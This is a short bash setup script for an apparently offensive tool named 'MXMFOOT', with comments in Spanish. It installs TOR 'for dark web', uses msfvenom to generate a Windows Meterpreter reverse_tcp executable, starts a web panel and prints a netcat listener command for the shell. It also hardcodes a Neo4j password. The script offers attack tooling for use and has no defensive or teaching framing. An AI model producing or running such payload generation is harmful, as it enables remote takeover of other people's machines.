#!/bin/bash

echo "🔥 MXMFOOT - Quick Start"
echo "========================"

# Instalar dependencias
pip install -r requirements.txt

# Levantar Neo4j con Docker
echo "[*] Levantando Neo4j..."
docker-compose up -d neo4j

# Configurar TOR para dark web
echo "[*] Configurando TOR..."
sudo apt install -y tor
sudo systemctl start tor

# Generar payloads
echo "[*] Generando payloads MSF..."
msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f exe -o /tmp/mxmfoot_payload.exe

# Ejecutar panel web
echo "[*] Iniciando panel web..."
cd web_panel
python app.py &

echo "[+] MXMFOOT listo!"
echo "    - Panel web: http://localhost:5000"
echo "    - Neo4j Browser: http://localhost:7474 (neo4j/mxmfoot2024)"
echo "    - Exploit listener: nc -lvnp 4444"
